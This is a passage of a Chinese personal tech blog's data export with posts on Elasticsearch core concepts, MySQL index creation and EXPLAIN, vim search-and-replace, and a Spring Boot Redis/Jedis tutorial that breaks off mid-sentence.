文档\n\n文档是可以被索引的信息的基本单位。用来存储信息。一般为JSON（JavaScript Object Notation）格式，这是一种非常普遍的互联网数据交换格式。<br>\n\n\n- Shards & Replicas 分片与副本\n\n索引可以存储大量的数据，这些数据可能超过单个节点的硬件限制。为了解决这一问题，当创建一个索引，可以定义你想要的分片数量。每个分片本身是一个全功能的、独立的“Index”，可以托管在集群中的任何节点。<br>\n\nShards分片的重要性主要体现在以下两个特征：<br>\n>分片允许您水平拆分或缩放内容的大小<br>\n>分片允许你分配和并行操作的碎片（可能在多个节点上）从而提高性能/吞吐量<br>\n\n\n副本是防止，在同一个集群网络或云环境上，出现故障时，分片和结点因为某些原因离线或消失。<br>\nReplicas的重要性主要体现在以下两个特征：<br>\n\n>副本为分片或节点失败提供了高可用性。为此，需要注意的是，一个副本的分片不会分配在同一个节点作为原始的或主分片，副本是从主分片那里复制过来的。<br>\n>副本允许用户扩展你的搜索量或吞吐量，因为搜索可以在所有副本上并行执行。\n\n\n- 重要\n\n<strong> es和关系型数据库的类似</strong>\n\n关系型数据库 | Elasticsearch\n:-: | :-:\nDatabase | Index\nTable  |Type\nRow | Document，非固定结构\nColumn | Field\nSchema | Mapping\n\n\n### 四.Spring集成\n\nhttps://www.cnblogs.com/leeSmall/p/9218779.html\n","slug":"tools/elasticserach","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ii002a6dcp2bh004d8","content":"<h3 id=\"一-介绍\"><a href=\"#一-介绍\" class=\"headerlink\" title=\"一.介绍\"></a>一.介绍</h3><p>Elasticsearch 是一个分布式的搜索引擎，底层基于Lucense。<br><br>最主要的功能是可以提供文档型数据的存储与检索，高效(几乎实时，毫秒级).<br></p>\n<h3 id=\"二-安装\"><a href=\"#二-安装\" class=\"headerlink\" title=\"二.安装\"></a>二.安装</h3><p><a href=\"https://www.cnblogs.com/leeSmall/p/9220535.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/leeSmall/p/9220535.html</a></p>\n<h3 id=\"三-重要概念\"><a href=\"#三-重要概念\" class=\"headerlink\" title=\"三.重要概念\"></a>三.重要概念</h3><ul>\n<li>Cluster 集群</li>\n</ul>\n<p>集群是一个或多个节点（服务器）的集合， 这些节点共同保存整个数据，并在所有节点上提供联合索引和搜索功能。一个集群由一个唯一集群ID确定，并指定一个集群名（默认为“elasticsearch”）。该集群名非常重要，因为节点可以通过这个集群名加入群集，一个节点只能是群集的一部分<br></p>\n<ul>\n<li>Node 节点</li>\n</ul>\n<p>节点是单个服务器实例，可以存储数据，并参与集群的索引和搜索功能。就像一个集群，节点的名称默认为一个随机的通用唯一标识符（UUID），确定在启动时分配给该节点。如果不希望默认，可以定义任何节点名。这个名字对管理很重要，目的是要确定你的网络服务器对应于你的ElasticSearch群集节点。<br></p>\n<ul>\n<li>Index 索引</li>\n</ul>\n<p>索引是具有相似特性的文档集合。例如，可以为客户数据提供索引，为产品目录建立另一个索引，以及为订单数据建立另一个索引。索引由名称（必须全部为小写）标识，该名称用于在对其中的文档执行索引、搜索、更新和删除操作时引用索引。<br></p>\n<ul>\n<li>Type 类型</li>\n</ul>\n<p>在索引中，可以定义一个或多个类型。类型是索引的逻辑类别/分区，其语义完全取决于您。一般来说，类型定义为具有公共字段集的文档。例如，假设你运行一个博客平台，并将所有数据存储在一个索引中。在这个索引中，您可以为用户数据定义一种类型，为博客数据定义另一种类型，以及为注释数据定义另一类型。<br></p>\n<ul>\n<li>Document 文档</li>\n</ul>\n<p>文档是可以被索引的信息的基本单位。用来存储信息。一般为JSON（JavaScript Object Notation）格式，这是一种非常普遍的互联网数据交换格式。<br></p>\n<ul>\n<li>Shards &amp; Replicas 分片与副本</li>\n</ul>\n<p>索引可以存储大量的数据，这些数据可能超过单个节点的硬件限制。为了解决这一问题，当创建一个索引，可以定义你想要的分片数量。每个分片本身是一个全功能的、独立的“Index”，可以托管在集群中的任何节点。<br></p>\n<p>Shards分片的重要性主要体现在以下两个特征：<br></p>\n<blockquote>\n<p>分片允许您水平拆分或缩放内容的大小<br><br>分片允许你分配和并行操作的碎片（可能在多个节点上）从而提高性能/吞吐量<br></p>\n</blockquote>\n<p>副本是防止，在同一个集群网络或云环境上，出现故障时，分片和结点因为某些原因离线或消失。<br><br>Replicas的重要性主要体现在以下两个特征：<br></p>\n<blockquote>\n<p>副本为分片或节点失败提供了高可用性。为此，需要注意的是，一个副本的分片不会分配在同一个节点作为原始的或主分片，副本是从主分片那里复制过来的。<br><br>副本允许用户扩展你的搜索量或吞吐量，因为搜索可以在所有副本上并行执行。</p>\n</blockquote>\n<ul>\n<li>重要</li>\n</ul>\n<p><strong> es和关系型数据库的类似</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">关系型数据库</th>\n<th style=\"text-align:center\">Elasticsearch</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">Database</td>\n<td style=\"text-align:center\">Index</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Table</td>\n<td style=\"text-align:center\">Type</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Row</td>\n<td style=\"text-align:center\">Document，非固定结构</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Column</td>\n<td style=\"text-align:center\">Field</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Schema</td>\n<td style=\"text-align:center\">Mapping</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"四-Spring集成\"><a href=\"#四-Spring集成\" class=\"headerlink\" title=\"四.Spring集成\"></a>四.Spring集成</h3><p><a href=\"https://www.cnblogs.com/leeSmall/p/9218779.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/leeSmall/p/9218779.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一-介绍\"><a href=\"#一-介绍\" class=\"headerlink\" title=\"一.介绍\"></a>一.介绍</h3><p>Elasticsearch 是一个分布式的搜索引擎，底层基于Lucense。<br><br>最主要的功能是可以提供文档型数据的存储与检索，高效(几乎实时，毫秒级).<br></p>\n<h3 id=\"二-安装\"><a href=\"#二-安装\" class=\"headerlink\" title=\"二.安装\"></a>二.安装</h3><p><a href=\"https://www.cnblogs.com/leeSmall/p/9220535.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/leeSmall/p/9220535.html</a></p>\n<h3 id=\"三-重要概念\"><a href=\"#三-重要概念\" class=\"headerlink\" title=\"三.重要概念\"></a>三.重要概念</h3><ul>\n<li>Cluster 集群</li>\n</ul>\n<p>集群是一个或多个节点（服务器）的集合， 这些节点共同保存整个数据，并在所有节点上提供联合索引和搜索功能。一个集群由一个唯一集群ID确定，并指定一个集群名（默认为“elasticsearch”）。该集群名非常重要，因为节点可以通过这个集群名加入群集，一个节点只能是群集的一部分<br></p>\n<ul>\n<li>Node 节点</li>\n</ul>\n<p>节点是单个服务器实例，可以存储数据，并参与集群的索引和搜索功能。就像一个集群，节点的名称默认为一个随机的通用唯一标识符（UUID），确定在启动时分配给该节点。如果不希望默认，可以定义任何节点名。这个名字对管理很重要，目的是要确定你的网络服务器对应于你的ElasticSearch群集节点。<br></p>\n<ul>\n<li>Index 索引</li>\n</ul>\n<p>索引是具有相似特性的文档集合。例如，可以为客户数据提供索引，为产品目录建立另一个索引，以及为订单数据建立另一个索引。索引由名称（必须全部为小写）标识，该名称用于在对其中的文档执行索引、搜索、更新和删除操作时引用索引。<br></p>\n<ul>\n<li>Type 类型</li>\n</ul>\n<p>在索引中，可以定义一个或多个类型。类型是索引的逻辑类别/分区，其语义完全取决于您。一般来说，类型定义为具有公共字段集的文档。例如，假设你运行一个博客平台，并将所有数据存储在一个索引中。在这个索引中，您可以为用户数据定义一种类型，为博客数据定义另一种类型，以及为注释数据定义另一类型。<br></p>\n<ul>\n<li>Document 文档</li>\n</ul>\n<p>文档是可以被索引的信息的基本单位。用来存储信息。一般为JSON（JavaScript Object Notation）格式，这是一种非常普遍的互联网数据交换格式。<br></p>\n<ul>\n<li>Shards &amp; Replicas 分片与副本</li>\n</ul>\n<p>索引可以存储大量的数据，这些数据可能超过单个节点的硬件限制。为了解决这一问题，当创建一个索引，可以定义你想要的分片数量。每个分片本身是一个全功能的、独立的“Index”，可以托管在集群中的任何节点。<br></p>\n<p>Shards分片的重要性主要体现在以下两个特征：<br></p>\n<blockquote>\n<p>分片允许您水平拆分或缩放内容的大小<br><br>分片允许你分配和并行操作的碎片（可能在多个节点上）从而提高性能/吞吐量<br></p>\n</blockquote>\n<p>副本是防止，在同一个集群网络或云环境上，出现故障时，分片和结点因为某些原因离线或消失。<br><br>Replicas的重要性主要体现在以下两个特征：<br></p>\n<blockquote>\n<p>副本为分片或节点失败提供了高可用性。为此，需要注意的是，一个副本的分片不会分配在同一个节点作为原始的或主分片，副本是从主分片那里复制过来的。<br><br>副本允许用户扩展你的搜索量或吞吐量，因为搜索可以在所有副本上并行执行。</p>\n</blockquote>\n<ul>\n<li>重要</li>\n</ul>\n<p><strong> es和关系型数据库的类似</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">关系型数据库</th>\n<th style=\"text-align:center\">Elasticsearch</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">Database</td>\n<td style=\"text-align:center\">Index</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Table</td>\n<td style=\"text-align:center\">Type</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Row</td>\n<td style=\"text-align:center\">Document，非固定结构</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Column</td>\n<td style=\"text-align:center\">Field</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Schema</td>\n<td style=\"text-align:center\">Mapping</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"四-Spring集成\"><a href=\"#四-Spring集成\" class=\"headerlink\" title=\"四.Spring集成\"></a>四.Spring集成</h3><p><a href=\"https://www.cnblogs.com/leeSmall/p/9218779.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/leeSmall/p/9218779.html</a></p>\n"},{"title":"Mysql索引了解","date":"2019-08-09T13:32:54.000Z","_content":"\n本文主要是为了对Mysql的索引有一个感性的理解.<br>\n\n优秀文章:https://tech.meituan.com/2014/06/30/mysql-index.html<br>\n\n# 一.索引简介\n\n## 1.什么是索引\n\n索引(Index)是帮助MySQL高效获取数据的数据结构. 实际上，索引也是一张表，利用某种数据结构(B+树或Hash索引，可以进行快速查找)，存储了索引与实体表记录直接的映射，可以通过查找索引，快速的查找到要找数据在实体表中的位置，减少IO操作。\n\n## 2.为什么要用或不用索引\n\n\n在查询操作时，索引可以极高的提升查询速度。<br>\n\n在更新(insert/update/delete)操作,mysql不仅需要保持数据，还需要更新保存一下索引文件(维护的数据与其所在位置关系).<br>\n\n注意，索引更新保存不等于索引重建<br>\n\n所以，什么时候要用或者不用索引，就有有了个大概方向了。在查询操作数量较多，或时间要求较高时，可以建索引，反之，就不用索引。<br>\n\n## 3.什么时候索引重建\n\n重建索引在常规的数据库维护操作中经常使用。在数据库运行了较长时间后，索引都有损坏的可能，这时就需要重建。对数据重建索引可以起到提高检索效率。<br>\n\n\n# 二.索引建立\n\n## 1.创建索引\n\n1．ALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引<br>\n```\nALTER TABLE table_name ADD INDEX index_name (column_list)\nALTER TABLE table_name ADD UNIQUE (column_list)\nALTER TABLE table_name ADD PRIMARY KEY (column_list)\n```\n2.CREATE INDEX可对表增加普通索引或UNIQUE索引<br>\n```\nCREATE INDEX index_name ON table_name (column_list)\nCREATE UNIQUE INDEX index_name ON table_name (column_list)\n```\n3.联合索引\n```\ncreate index 索引名 on 表名（字段名1，字段名2）\n```\n\n\n## 2.最左前缀匹配\n\n在mysql建立 <strong>联合索引时</strong> 会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配.<br>\n\n```\nIndex顺序 (col,col3,col2)\nSELECT * FROM test WHERE col1=“1” AND col2=“2” AND col3=“3”\n```\n意思就是，如上，该查询会先进行col1=1匹配，再进行col3=3,最好进行col2=2<br>\n\n## 3.explain\n\n可用explain来分析sql执行情况.\n```\nEXPLAIN\nSELECT org_seq, api_code\n    FROM api_log a\nINNER JOIN\n    cost_org_pre_stock_change_detail b ON a.org_code=b.orgcode\nWHERE a.sequence='vGGztA1b'\n```\n![index1](http://67.216.218.49:8000/file/blogs/database/mysql/mysql_index_1.png)\n\n一般来说，rows 越小，说明查找的行数越少，速度越快.<br>\n","source":"_posts/tools/mysql索引简要了解.md","raw":"---\ntitle: Mysql索引了解\ndate: 2019-08-09 09:32:54\ntags: [database]\n---\n\n本文主要是为了对Mysql的索引有一个感性的理解.<br>\n\n优秀文章:https://tech.meituan.com/2014/06/30/mysql-index.html<br>\n\n# 一.索引简介\n\n## 1.什么是索引\n\n索引(Index)是帮助MySQL高效获取数据的数据结构. 实际上，索引也是一张表，利用某种数据结构(B+树或Hash索引，可以进行快速查找)，存储了索引与实体表记录直接的映射，可以通过查找索引，快速的查找到要找数据在实体表中的位置，减少IO操作。\n\n## 2.为什么要用或不用索引\n\n\n在查询操作时，索引可以极高的提升查询速度。<br>\n\n在更新(insert/update/delete)操作,mysql不仅需要保持数据，还需要更新保存一下索引文件(维护的数据与其所在位置关系).<br>\n\n注意，索引更新保存不等于索引重建<br>\n\n所以，什么时候要用或者不用索引，就有有了个大概方向了。在查询操作数量较多，或时间要求较高时，可以建索引，反之，就不用索引。<br>\n\n## 3.什么时候索引重建\n\n重建索引在常规的数据库维护操作中经常使用。在数据库运行了较长时间后，索引都有损坏的可能，这时就需要重建。对数据重建索引可以起到提高检索效率。<br>\n\n\n# 二.索引建立\n\n## 1.创建索引\n\n1．ALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引<br>\n```\nALTER TABLE table_name ADD INDEX index_name (column_list)\nALTER TABLE table_name ADD UNIQUE (column_list)\nALTER TABLE table_name ADD PRIMARY KEY (column_list)\n```\n2.CREATE INDEX可对表增加普通索引或UNIQUE索引<br>\n```\nCREATE INDEX index_name ON table_name (column_list)\nCREATE UNIQUE INDEX index_name ON table_name (column_list)\n```\n3.联合索引\n```\ncreate index 索引名 on 表名（字段名1，字段名2）\n```\n\n\n## 2.最左前缀匹配\n\n在mysql建立 <strong>联合索引时</strong> 会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配.<br>\n\n```\nIndex顺序 (col,col3,col2)\nSELECT * FROM test WHERE col1=“1” AND col2=“2” AND col3=“3”\n```\n意思就是，如上，该查询会先进行col1=1匹配，再进行col3=3,最好进行col2=2<br>\n\n## 3.explain\n\n可用explain来分析sql执行情况.\n```\nEXPLAIN\nSELECT org_seq, api_code\n    FROM api_log a\nINNER JOIN\n    cost_org_pre_stock_change_detail b ON a.org_code=b.orgcode\nWHERE a.sequence='vGGztA1b'\n```\n![index1](http://67.216.218.49:8000/file/blogs/database/mysql/mysql_index_1.png)\n\n一般来说，rows 越小，说明查找的行数越少，速度越快.<br>\n","slug":"tools/mysql索引简要了解","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ij002c6dcp38az62ze","content":"<p>本文主要是为了对Mysql的索引有一个感性的理解.<br></p>\n<p>优秀文章:<a href=\"https://tech.meituan.com/2014/06/30/mysql-index.html\" target=\"_blank\" rel=\"noopener\">https://tech.meituan.com/2014/06/30/mysql-index.html</a><br></p>\n<h1 id=\"一-索引简介\"><a href=\"#一-索引简介\" class=\"headerlink\" title=\"一.索引简介\"></a>一.索引简介</h1><h2 id=\"1-什么是索引\"><a href=\"#1-什么是索引\" class=\"headerlink\" title=\"1.什么是索引\"></a>1.什么是索引</h2><p>索引(Index)是帮助MySQL高效获取数据的数据结构. 实际上，索引也是一张表，利用某种数据结构(B+树或Hash索引，可以进行快速查找)，存储了索引与实体表记录直接的映射，可以通过查找索引，快速的查找到要找数据在实体表中的位置，减少IO操作。</p>\n<h2 id=\"2-为什么要用或不用索引\"><a href=\"#2-为什么要用或不用索引\" class=\"headerlink\" title=\"2.为什么要用或不用索引\"></a>2.为什么要用或不用索引</h2><p>在查询操作时，索引可以极高的提升查询速度。<br></p>\n<p>在更新(insert/update/delete)操作,mysql不仅需要保持数据，还需要更新保存一下索引文件(维护的数据与其所在位置关系).<br></p>\n<p>注意，索引更新保存不等于索引重建<br></p>\n<p>所以，什么时候要用或者不用索引，就有有了个大概方向了。在查询操作数量较多，或时间要求较高时，可以建索引，反之，就不用索引。<br></p>\n<h2 id=\"3-什么时候索引重建\"><a href=\"#3-什么时候索引重建\" class=\"headerlink\" title=\"3.什么时候索引重建\"></a>3.什么时候索引重建</h2><p>重建索引在常规的数据库维护操作中经常使用。在数据库运行了较长时间后，索引都有损坏的可能，这时就需要重建。对数据重建索引可以起到提高检索效率。<br></p>\n<h1 id=\"二-索引建立\"><a href=\"#二-索引建立\" class=\"headerlink\" title=\"二.索引建立\"></a>二.索引建立</h1><h2 id=\"1-创建索引\"><a href=\"#1-创建索引\" class=\"headerlink\" title=\"1.创建索引\"></a>1.创建索引</h2><p>1．ALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALTER TABLE table_name ADD INDEX index_name (column_list)</span><br><span class=\"line\">ALTER TABLE table_name ADD UNIQUE (column_list)</span><br><span class=\"line\">ALTER TABLE table_name ADD PRIMARY KEY (column_list)</span><br></pre></td></tr></table></figure></p>\n<p>2.CREATE INDEX可对表增加普通索引或UNIQUE索引<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE INDEX index_name ON table_name (column_list)</span><br><span class=\"line\">CREATE UNIQUE INDEX index_name ON table_name (column_list)</span><br></pre></td></tr></table></figure></p>\n<p>3.联合索引<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create index 索引名 on 表名（字段名1，字段名2）</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-最左前缀匹配\"><a href=\"#2-最左前缀匹配\" class=\"headerlink\" title=\"2.最左前缀匹配\"></a>2.最左前缀匹配</h2><p>在mysql建立 <strong>联合索引时</strong> 会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Index顺序 (col,col3,col2)</span><br><span class=\"line\">SELECT * FROM test WHERE col1=“1” AND col2=“2” AND col3=“3”</span><br></pre></td></tr></table></figure>\n<p>意思就是，如上，该查询会先进行col1=1匹配，再进行col3=3,最好进行col2=2<br></p>\n<h2 id=\"3-explain\"><a href=\"#3-explain\" class=\"headerlink\" title=\"3.explain\"></a>3.explain</h2><p>可用explain来分析sql执行情况.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXPLAIN</span><br><span class=\"line\">SELECT org_seq, api_code</span><br><span class=\"line\">    FROM api_log a</span><br><span class=\"line\">INNER JOIN</span><br><span class=\"line\">    cost_org_pre_stock_change_detail b ON a.org_code=b.orgcode</span><br><span class=\"line\">WHERE a.sequence=&apos;vGGztA1b&apos;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/database/mysql/mysql_index_1.png\" alt=\"index1\"></p>\n<p>一般来说，rows 越小，说明查找的行数越少，速度越快.<br></p>\n","site":{"data":{}},"excerpt":"","more":"<p>本文主要是为了对Mysql的索引有一个感性的理解.<br></p>\n<p>优秀文章:<a href=\"https://tech.meituan.com/2014/06/30/mysql-index.html\" target=\"_blank\" rel=\"noopener\">https://tech.meituan.com/2014/06/30/mysql-index.html</a><br></p>\n<h1 id=\"一-索引简介\"><a href=\"#一-索引简介\" class=\"headerlink\" title=\"一.索引简介\"></a>一.索引简介</h1><h2 id=\"1-什么是索引\"><a href=\"#1-什么是索引\" class=\"headerlink\" title=\"1.什么是索引\"></a>1.什么是索引</h2><p>索引(Index)是帮助MySQL高效获取数据的数据结构. 实际上，索引也是一张表，利用某种数据结构(B+树或Hash索引，可以进行快速查找)，存储了索引与实体表记录直接的映射，可以通过查找索引，快速的查找到要找数据在实体表中的位置，减少IO操作。</p>\n<h2 id=\"2-为什么要用或不用索引\"><a href=\"#2-为什么要用或不用索引\" class=\"headerlink\" title=\"2.为什么要用或不用索引\"></a>2.为什么要用或不用索引</h2><p>在查询操作时，索引可以极高的提升查询速度。<br></p>\n<p>在更新(insert/update/delete)操作,mysql不仅需要保持数据，还需要更新保存一下索引文件(维护的数据与其所在位置关系).<br></p>\n<p>注意，索引更新保存不等于索引重建<br></p>\n<p>所以，什么时候要用或者不用索引，就有有了个大概方向了。在查询操作数量较多，或时间要求较高时，可以建索引，反之，就不用索引。<br></p>\n<h2 id=\"3-什么时候索引重建\"><a href=\"#3-什么时候索引重建\" class=\"headerlink\" title=\"3.什么时候索引重建\"></a>3.什么时候索引重建</h2><p>重建索引在常规的数据库维护操作中经常使用。在数据库运行了较长时间后，索引都有损坏的可能，这时就需要重建。对数据重建索引可以起到提高检索效率。<br></p>\n<h1 id=\"二-索引建立\"><a href=\"#二-索引建立\" class=\"headerlink\" title=\"二.索引建立\"></a>二.索引建立</h1><h2 id=\"1-创建索引\"><a href=\"#1-创建索引\" class=\"headerlink\" title=\"1.创建索引\"></a>1.创建索引</h2><p>1．ALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALTER TABLE table_name ADD INDEX index_name (column_list)</span><br><span class=\"line\">ALTER TABLE table_name ADD UNIQUE (column_list)</span><br><span class=\"line\">ALTER TABLE table_name ADD PRIMARY KEY (column_list)</span><br></pre></td></tr></table></figure></p>\n<p>2.CREATE INDEX可对表增加普通索引或UNIQUE索引<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE INDEX index_name ON table_name (column_list)</span><br><span class=\"line\">CREATE UNIQUE INDEX index_name ON table_name (column_list)</span><br></pre></td></tr></table></figure></p>\n<p>3.联合索引<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create index 索引名 on 表名（字段名1，字段名2）</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-最左前缀匹配\"><a href=\"#2-最左前缀匹配\" class=\"headerlink\" title=\"2.最左前缀匹配\"></a>2.最左前缀匹配</h2><p>在mysql建立 <strong>联合索引时</strong> 会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Index顺序 (col,col3,col2)</span><br><span class=\"line\">SELECT * FROM test WHERE col1=“1” AND col2=“2” AND col3=“3”</span><br></pre></td></tr></table></figure>\n<p>意思就是，如上，该查询会先进行col1=1匹配，再进行col3=3,最好进行col2=2<br></p>\n<h2 id=\"3-explain\"><a href=\"#3-explain\" class=\"headerlink\" title=\"3.explain\"></a>3.explain</h2><p>可用explain来分析sql执行情况.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXPLAIN</span><br><span class=\"line\">SELECT org_seq, api_code</span><br><span class=\"line\">    FROM api_log a</span><br><span class=\"line\">INNER JOIN</span><br><span class=\"line\">    cost_org_pre_stock_change_detail b ON a.org_code=b.orgcode</span><br><span class=\"line\">WHERE a.sequence=&apos;vGGztA1b&apos;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/database/mysql/mysql_index_1.png\" alt=\"index1\"></p>\n<p>一般来说，rows 越小，说明查找的行数越少，速度越快.<br></p>\n"},{"title":"vim","date":"2019-01-16T19:10:33.000Z","_content":"### 1.查找替换\n\n```\n全局替换\n:%s/old/new/g\n当前行替换\n:s/old/new/g\n替换当前行第一个\n:s/old/new/\n```\n","source":"_posts/tools/vim.md","raw":"---\ntitle: vim\ndate: 2019-01-16 14:10:33\ntags: [tools]\n---\n### 1.查找替换\n\n```\n全局替换\n:%s/old/new/g\n当前行替换\n:s/old/new/g\n替换当前行第一个\n:s/old/new/\n```\n","slug":"tools/vim","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ik002e6dcpk9fbqu8l","content":"<h3 id=\"1-查找替换\"><a href=\"#1-查找替换\" class=\"headerlink\" title=\"1.查找替换\"></a>1.查找替换</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">全局替换</span><br><span class=\"line\">:%s/old/new/g</span><br><span class=\"line\">当前行替换</span><br><span class=\"line\">:s/old/new/g</span><br><span class=\"line\">替换当前行第一个</span><br><span class=\"line\">:s/old/new/</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-查找替换\"><a href=\"#1-查找替换\" class=\"headerlink\" title=\"1.查找替换\"></a>1.查找替换</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">全局替换</span><br><span class=\"line\">:%s/old/new/g</span><br><span class=\"line\">当前行替换</span><br><span class=\"line\">:s/old/new/g</span><br><span class=\"line\">替换当前行第一个</span><br><span class=\"line\">:s/old/new/</span><br></pre></td></tr></table></figure>\n"},{"title":"springboot-redis","date":"2018-09-17T15:14:52.000Z","_content":"\n## 1.redis大概\n\n\n### 1.2 Jedis\n```\n<dependency>\n\t<groupId>redis.clients</groupId>\n\t<artifactId>jedis</artifactId>\n\t<version>2.7.3</version>\n</dependency>\n<!-- Springboot自带的redis与redis.clients有冲突，为了使用jodis,选redis.clients -->\n<!--<dependency>-->\n    <!--<groupId>org.springframework.boot</groupId>-->\n    <!--<artifactId>spring-boot-starter-data-redis</artifactId>-->\n<!--</dependency>-->\n```\n\n通过redis.clients.jedis.JedisPool来管理，即通过池来管理，通过池对象获取jedis实例，然后通过jedis实例直接操作redis服务，剔除了与业务无关的冗余代码\n<br/>\n\n配置类\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.PropertySource;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\n@Configuration\n@PropertySource({ \"classpath:application.properties\" })\npublic class JedisConfig {\n\n    @Bean\n    public JedisPool getJedisPool(){\n        JedisPoolConfig config = new JedisPoolConfig();\n        //连接设置\n        //config.setMaxTotal(Integer.parseInt(maxTotal));\n        //config.set（等等）\n        //建立连接\n        JedisPool jedisPool = new JedisPool(config, \"127.0.0.1\", 6379);\n        return jedisPool;\n    }\n\n\n}\n\n```\n\n使用\n```\npackage com.example.redisdemo.jedis;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.List;\n\n@Service\npublic class JedisServer {\n    @Autowired\n    JedisPool jedisPool;\n\n    public  void setKey(String key, Object value){\n        //try/catch后面添加\n        Jedis jedis = jedisPool.getResource();\n         //set(String, String) 所以List需要序列化,此处value为list\n        //jedis.set(key.getBytes(), ObjectTranscoder.serialize(value));\n        //设置过期时间\n        jedis.setex(key.getBytes(),600, ObjectTranscoder.serialize(value));\n    }\n\n    public Object getKey(String key){\n        Jedis jedis = jedisPool.getResource();\n        if(jedis == null || !jedis.exists(key.getBytes())){\n            return null;\n        }\n        byte[] in = jedis.get(key.getBytes());\n        List list = (List) ObjectTranscoder.deserialize(in);\n        return list;\n    }\n}\n\n```\n### 1.3 Jodis\n```\n        <dependency>\n            <groupId>redis.clients</groupId>\n            <artifactId>jedis</artifactId>\n            <version>2.7.3</version>\n        </dependency>\n        <dependency>\n            <groupId>com.wandoulabs.jodis</groupId>\n            <artifactId>jodis</artifactId>\n            <version>0.2.2</version>\n        </dependency>\n```\n\n与codis结合使用对jedispool做了封装。<br/>\n通过zookeeper上注册的codis 